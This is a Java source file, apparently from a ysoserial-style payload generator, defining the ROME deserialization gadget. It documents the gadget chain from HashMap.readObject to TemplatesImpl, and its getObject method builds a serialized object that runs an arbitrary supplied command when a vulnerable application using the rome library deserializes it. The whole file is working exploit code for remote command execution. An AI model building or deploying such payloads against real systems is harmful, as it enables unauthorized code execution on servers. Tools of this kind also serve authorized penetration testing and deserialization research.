package com.h2tg.ysogate.payloads.gadgets;


import javax.xml.transform.Templates;

import com.h2tg.ysogate.bullet.jdk.GHashMap;
import com.h2tg.ysogate.utils.PayloadRunner;
import com.sun.syndication.feed.impl.ObjectBean;

import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.annotation.Authors;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.Gadgets;

/**
 * TemplatesImpl.getOutputProperties()
 * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
 * NativeMethodAccessorImpl.invoke(Object, Object[])
 * DelegatingMethodAccessorImpl.invoke(Object, Object[])
 * Method.invoke(Object, Object...)
 * ToStringBean.toString(String)
 * ToStringBean.toString()
 * ObjectBean.toString()
 * EqualsBean.beanHashCode()
 * ObjectBean.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 *
 * @author mbechler
 */
@Dependencies("rome:rome:1.0")
@Authors({Authors.MBECHLER})
public class ROME implements CommandObjectPayload<Object>
{

	public Object getObject(String command) throws Exception {
		Object     o        = Gadgets.createTemplatesImpl(command);
		ObjectBean delegate = new ObjectBean(Templates.class, o);
		ObjectBean root     = new ObjectBean(ObjectBean.class, delegate);
		GHashMap gHashMap = new GHashMap();
		return gHashMap.readObject2HashCode(root, root);
//		return Gadgets.makeMap(root, root);
	}

	public static void main ( final String[] args ) throws Exception {
		PayloadRunner.run(ROME.class, args);
	}
}
